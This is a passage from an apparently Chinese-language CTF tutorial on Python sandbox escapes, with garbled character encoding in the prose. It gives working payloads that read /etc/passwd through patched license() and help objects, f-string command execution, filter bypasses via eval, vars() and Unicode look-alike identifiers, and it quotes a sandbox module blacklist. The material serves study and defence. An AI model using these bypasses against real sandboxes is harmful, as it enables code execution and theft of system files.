<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>): <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure></div>

<p>å½“ä½ æŠŠæ–‡ä»¶å¯¹è±¡ä¼ ç»™ <code>set</code>ï¼Œ<code>set</code> ä¼šéå†æ–‡ä»¶å¯¹è±¡ï¼ŒæŠŠ<strong>æ¯ä¸€è¡Œ</strong>ï¼ˆåŒ…å«æ¢è¡Œç¬¦ï¼‰ä½œä¸ºä¸€ä¸ªå…ƒç´ åŠ å…¥é›†åˆã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>)))</span><br></pre></td></tr></table></figure></div>
</blockquote>
</li>
<li><p>åº”ç”¨ <code>@print</code>ï¼Œè°ƒç”¨ <code>print(&lt;set of lines&gt;)</code> ä¼šæŠŠé›†åˆå†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šã€‚<code>print</code> **è¿”å› <code>None</code>**ã€‚</p>
</li>
<li><p>æœ€ç»ˆ <code>a</code> è¢«èµ‹å€¼ä¸º <code>None</code>ï¼ˆå› ä¸ºæœ€å¤–å±‚è£…é¥°å™¨ <code>print</code> è¿”å›å€¼æ˜¯ <code>None</code>ï¼‰ã€‚</p>
</li>
</ol>
<h3 id="åˆ©ç”¨é­”æœ¯æ–¹æ³•"><a href="#åˆ©ç”¨é­”æœ¯æ–¹æ³•" class="headerlink" title="åˆ©ç”¨é­”æœ¯æ–¹æ³•"></a>åˆ©ç”¨é­”æœ¯æ–¹æ³•</h3><p>ä¾‹å¦‚ <code>enum.EnumMeta.__getitem__</code></p>
<h3 id="ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨-with"><a href="#ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨-with" class="headerlink" title="ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ with"></a>ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ <code>with</code></h3><p>å½“è¿‡æ»¤ <code>()</code> æ—¶æˆ‘ä»¬éœ€è¦è€ƒè™‘ä¸€äº›å‡½æ•°çš„éšå¼è°ƒç”¨ï¼Œå³æŸäº›è¿‡ç¨‹ä¸­å¯èƒ½ä¼šåœ¨å†…éƒ¨æŠŠæŸä¸ªå±æ€§å½“åšå‡½æ•°è°ƒç”¨ï¼Œç„¶åè®¾ç½®è¿™äº›å‡½æ•°å³å¯ã€‚ </p>
<p>è¿™é‡Œ<strong>è®© <code>help</code> å¯¹è±¡å˜æˆä¸€ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨</strong>ï¼Œå¹¶ä¸” <code>help.__enter__()</code> è¦†å†™æˆ <code>license()</code> å‡½æ•°ï¼Œç„¶åä½¿ç”¨ <code>with</code> è°ƒç”¨ <code>help.__enter__() â†’ license()</code> è¾“å‡ºå†…å®¹ã€‚</p>
<p><code>help</code> æœ¬è´¨æ˜¯ <code>_sitebuiltins._Helper</code> ç±»çš„å®ä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="built_in">help</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªç±»é»˜è®¤ä¸å®ç° <code>__enter__</code> å’Œ <code>__exit__</code> æ–¹æ³•ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ç”¨ <code>with help:</code>ã€‚</p>
<blockquote>
<p><code>with</code> æ˜¯ <strong>ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆContext Managerï¼‰</strong> è¯­æ³•ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼š</p>
<ul>
<li>åœ¨ä»£ç å—å¼€å§‹å‰åšä¸€äº›å‡†å¤‡å·¥ä½œ</li>
<li>åœ¨ä»£ç å—ç»“æŸåè‡ªåŠ¨æ¸…ç†èµ„æºï¼ˆä¸ç®¡æœ‰æ²¡æœ‰å‡ºé”™ï¼‰</li>
</ul>
<p>ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¿…é¡»å®ç°ä¸¤ä¸ªæ–¹æ³•ï¼š</p>
<ul>
<li><p><code>__enter__(self)</code> â†’ è¿›å…¥ <code>with</code> ä»£ç å—å‰è°ƒç”¨ï¼Œè¿”å›çš„å€¼ä¼šèµ‹ç»™ <code>as</code> åé¢çš„å˜é‡ã€‚</p>
</li>
<li><p><code>__exit__(self, exc_type, exc_val, exc_tb)</code> â†’ ç¦»å¼€ <code>with</code> ä»£ç å—æ—¶è°ƒç”¨ï¼Œä¸ç®¡æœ‰æ²¡æœ‰å¼‚å¸¸éƒ½ä¼šæ‰§è¡Œã€‚</p>
</li>
</ul>
</blockquote>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠ <code>help</code> é­”æ”¹æˆä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼š</p>
<ol>
<li>ç»™ <code>help</code> çš„ç±»åŠ¨æ€æ·»åŠ  <code>__enter__</code> æ–¹æ³•ï¼ŒæŒ‡å‘åˆšæ‰æ”¹è¿‡ <code>_Printer__filenames</code> çš„ <code>license</code> å¯¹è±¡ã€‚è¿™æ · <code>with a:</code> æ‰§è¡Œæ—¶ï¼Œ<code>__enter__</code> ä¼šè¢«è°ƒç”¨ â†’ è§¦å‘ <code>license()</code> â†’ è¯»å–æ–‡ä»¶ã€‚</li>
<li>ç»™å®ƒåŠ ä¸Š <code>__exit__</code> æ–¹æ³•ï¼ˆè¿”å› <code>None</code> å°±å¥½ï¼‰ï¼Œä¿è¯ <code>with</code> è¯­å¥èƒ½æ­£å¸¸é€€å‡ºã€‚</li>
</ol>
<p>ä¹‹åç”¨ <code>with</code> è§¦å‘è¯»å–ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> a: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p><code>a</code> æ˜¯ <code>help</code> å¯¹è±¡ï¼Œ<code>with</code> è¯­å¥ä¼šè°ƒç”¨ <code>a.__enter__()</code> â†’ å®é™…ä¸Šæ˜¯ <code>license()</code> â†’ æ‰“å° <code>/etc/passwd</code> å†…å®¹</p>
<p>å®Œæ•´ä»£ç ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> a: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<h2 id="f-å­—ç¬¦ä¸²æ‰§è¡Œ"><a href="#f-å­—ç¬¦ä¸²æ‰§è¡Œ" class="headerlink" title="f å­—ç¬¦ä¸²æ‰§è¡Œ"></a>f å­—ç¬¦ä¸²æ‰§è¡Œ</h2><p>f å­—ç¬¦ä¸²ç®—ä¸ä¸Šä¸€ä¸ªç»•è¿‡ï¼Œæ›´åƒæ˜¯ä¸€ç§æ–°çš„æ”»å‡»é¢ï¼Œé€šå¸¸æƒ…å†µä¸‹ç”¨æ¥è·å–æ•æ„Ÿä¸Šä¸‹æ–‡ä¿¡æ¯,ä¾‹å¦‚è¿‡å»ç¯å¢ƒå˜é‡</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;whoami.__class__.__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].environ&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].path&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].modules&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access an element through several links</span></span><br><span class="line">&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå¯ä»¥ç›´æ¥ RCE</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">kali</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;<span class="subst">&#123;__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="ååºåˆ—åŒ–ç»•è¿‡"><a href="#ååºåˆ—åŒ–ç»•è¿‡" class="headerlink" title="ååºåˆ—åŒ–ç»•è¿‡"></a>ååºåˆ—åŒ–ç»•è¿‡</h2><h2 id="è¿‡æ»¤äº†å†…å»ºå‡½æ•°"><a href="#è¿‡æ»¤äº†å†…å»ºå‡½æ•°" class="headerlink" title="è¿‡æ»¤äº†å†…å»ºå‡½æ•°"></a>è¿‡æ»¤äº†å†…å»ºå‡½æ•°</h2><h3 id="eval-list-dict-æ„é€ "><a href="#eval-list-dict-æ„é€ " class="headerlink" title="eval + list + dict æ„é€ "></a>eval + list + dict æ„é€ </h3><p>å‡å¦‚æˆ‘ä»¬åœ¨æ„é€  payload æ—¶éœ€è¦ä½¿ç”¨ str å‡½æ•°ã€bool å‡½æ•°ã€bytes å‡½æ•°ç­‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ eval è¿›è¡Œç»•è¿‡ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;bool&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;st&#x27;</span>+<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±å¯ä»¥å°†å‡½æ•°åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œè¿›è€Œå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å˜æ¢æ¥è¿›è¡Œç»•è¿‡ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·ä¸€æ¥ï¼Œåªè¦ list å’Œ dict æ²¡æœ‰è¢«ç¦ï¼Œå°±å¯ä»¥è·å–åˆ°ä»»æ„çš„å†…å»ºå‡½æ•°ã€‚å¦‚æœæŸä¸ªæ¨¡å—å·²ç»è¢«å¯¼å…¥äº†ï¼Œåˆ™ä¹Ÿå¯ä»¥è·å–è¿™ä¸ªæ¨¡å—ä¸­çš„å‡½æ•°ã€‚</p>
<h2 id="è¿‡æ»¤äº†-å’Œ-å¦‚ä½•è·å–å‡½æ•°"><a href="#è¿‡æ»¤äº†-å’Œ-å¦‚ä½•è·å–å‡½æ•°" class="headerlink" title="è¿‡æ»¤äº† . å’Œ , å¦‚ä½•è·å–å‡½æ•°"></a>è¿‡æ»¤äº† <code>.</code> å’Œ <code>,</code> å¦‚ä½•è·å–å‡½æ•°</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡ç‚¹å·æ¥è¿›è¡Œè°ƒç”¨<code>__import__(&#39;binascii&#39;).a2b_base64</code></p>
<p>æˆ–è€…é€šè¿‡ getattr å‡½æ•°ï¼š<code>getattr(__import__(&#39;binascii&#39;),&#39;a2b_base64&#39;)</code></p>
<p>å¦‚æœå°† , å·å’Œ . éƒ½è¿‡æ»¤äº†ï¼Œåˆ™å¯ä»¥æœ‰å¦‚ä¸‹çš„å‡ ç§æ–¹å¼è·å–å‡½æ•°ï¼š</p>
<ul>
<li><p>å†…å»ºå‡½æ•°å¯ä»¥ä½¿ç”¨<code>eval(list(dict(s_t_r=1))[0][::2])</code> è¿™æ ·çš„æ–¹å¼è·å–ã€‚</p>
</li>
<li><p>æ¨¡å—å†…çš„å‡½æ•°å¯ä»¥å…ˆä½¿ç”¨ <code>__import__</code> å¯¼å…¥å‡½æ•°ï¼Œç„¶åä½¿ç”¨ <code>vars()</code> è¿›è¡Œè·å–ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">vars</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;binascii&#x27;</span>))[<span class="string">&#x27;a2b_base64&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function a2b_base64&gt;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="unicode-ç»•è¿‡"><a href="#unicode-ç»•è¿‡" class="headerlink" title="unicode ç»•è¿‡"></a>unicode ç»•è¿‡</h2><p>Python 3 å¼€å§‹æ”¯æŒé ASCII å­—ç¬¦çš„æ ‡è¯†ç¬¦ï¼ˆPEP 3131ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥ä½¿ç”¨ Unicode å­—ç¬¦ä½œä¸º Python çš„å˜é‡åï¼Œå‡½æ•°åç­‰ã€‚Python åœ¨è§£æä»£ç æ—¶ï¼Œä½¿ç”¨çš„ Unicode Normalization Form KC (NFKC) è§„èŒƒåŒ–ç®—æ³•ï¼Œè¿™ç§ç®—æ³•å¯ä»¥å°†ä¸€äº›è§†è§‰ä¸Šç›¸ä¼¼çš„ Unicode å­—ç¬¦ç»Ÿä¸€ä¸ºä¸€ä¸ªæ ‡å‡†å½¢å¼ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span> == ğ˜¦val</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<p>ç›¸ä¼¼ unicode å¯»æ‰¾ç½‘ç«™ï¼š<a class="link"   target="_blank" rel="noopener" href="http://shapecatcher.com/" >http://shapecatcher.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> å¯ä»¥é€šè¿‡ç»˜åˆ¶çš„æ–¹å¼å¯»æ‰¾ç›¸ä¼¼å­—ç¬¦</p>
<p>ä¸‹é¢æ˜¯ 0-9,a-z çš„ unicode å­—ç¬¦</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—</span><br><span class="line">ğ˜¢ğ˜£ğ˜¤ğ˜¥ğ˜¦ğ˜§ğ˜¨ğ˜©ğ˜ªğ˜«ğ˜¬ğ˜­ğ˜®ğ˜¯ğ˜°ğ˜±ğ˜²ğ˜³ğ˜´ğ˜µğ˜¶ğ˜·ğ˜¸ğ˜¹ğ˜ºğ˜» </span><br><span class="line">ğ˜ˆğ˜‰ğ˜Šğ˜‹ğ˜Œğ˜ğ˜ğ˜ğ˜ğ˜‘ğ˜’ğ˜”ğ˜•ğ˜–ğ˜—ğ˜˜ğ˜™ğ˜šğ˜›ğ˜œğ˜ğ˜ğ˜Ÿğ˜ ğ˜¡ </span><br></pre></td></tr></table></figure></div>

<p>ä¸‹åˆ’çº¿å¯ä»¥ä½¿ç”¨å¯¹åº”çš„å…¨è§’å­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼¿</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Python å…è®¸å˜é‡åé‡Œæ··åˆç”¨<strong>æ™®é€šçš„ä¸‹åˆ’çº¿ <code>_</code></strong> å’Œ<strong>å…¨è§’ä¸‹åˆ’çº¿ <code>ï¼¿</code>ï¼ˆU+FF3Fï¼‰</strong>ã€‚ä½†æ˜¯<strong>å˜é‡åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</strong>å¿…é¡»æ˜¯<strong>å­—æ¯ï¼ˆASCII æˆ–æŸäº› Unicode å­—æ¯ï¼‰</strong>æˆ–**æ™®é€šçš„ä¸‹åˆ’çº¿ <code>_</code>**ã€‚å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å…¨è§’ä¸‹åˆ’çº¿ <code>ï¼¿</code>ï¼ŒPython ä¼šç›´æ¥åœ¨è§£æé˜¶æ®µæŠ¥ <code>SyntaxError</code>ï¼Œå› ä¸ºå®ƒä¸è®¤ä¸º <code>ï¼¿</code> ç¬¦åˆâ€œå˜é‡åå¼€å¤´çš„åˆæ³•å­—ç¬¦è§„åˆ™â€ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_ï¼¿name_ï¼¿)</span><br><span class="line">__main__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(ï¼¿ï¼¿name_ï¼¿)</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(ï¼¿ï¼¿name_ï¼¿)</span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid character <span class="string">&#x27;ï¼¿&#x27;</span> (U+FF3F)</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤–æœ‰äº›ç‰¹æ®Šçš„ Unicode å­—ç¬¦ä¼šåœ¨<strong>è°ƒç”¨ <code>.lower()</code> æˆ– <code>.upper()</code></strong> æ—¶è‡ªåŠ¨å˜æˆå…¶ä»–å­—ç¬¦ã€‚æ¯”å¦‚ Kelvin ç¬¦å· <code>â„ª</code>ï¼ˆU+212Aï¼‰ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&quot;â„ª&quot;</span>.lower())  <span class="comment"># ç»“æœæ˜¯ &#x27;k&#x27;</span></span><br><span class="line">k</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h1 id="ç»•è¿‡å‘½åç©ºé—´é™åˆ¶"><a href="#ç»•è¿‡å‘½åç©ºé—´é™åˆ¶" class="headerlink" title="ç»•è¿‡å‘½åç©ºé—´é™åˆ¶"></a>ç»•è¿‡å‘½åç©ºé—´é™åˆ¶</h1><h2 id="éƒ¨åˆ†é™åˆ¶"><a href="#éƒ¨åˆ†é™åˆ¶" class="headerlink" title="éƒ¨åˆ†é™åˆ¶"></a>éƒ¨åˆ†é™åˆ¶</h2><p>æœ‰äº›æ²™ç®±åœ¨æ„å»ºæ—¶ä½¿ç”¨ exec æ¥æ‰§è¡Œå‘½ä»¤ï¼Œexec å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æŒ‡å®šå‘½åç©ºé—´ï¼Œé€šè¿‡ä¿®æ”¹ã€åˆ é™¤å‘½åç©ºé—´ä¸­çš„å‡½æ•°åˆ™å¯ä»¥æ„å»ºä¸€ä¸ªæ²™ç®±ã€‚ä¾‹å­æ¥æºäº iscc_2016_pycalcã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">    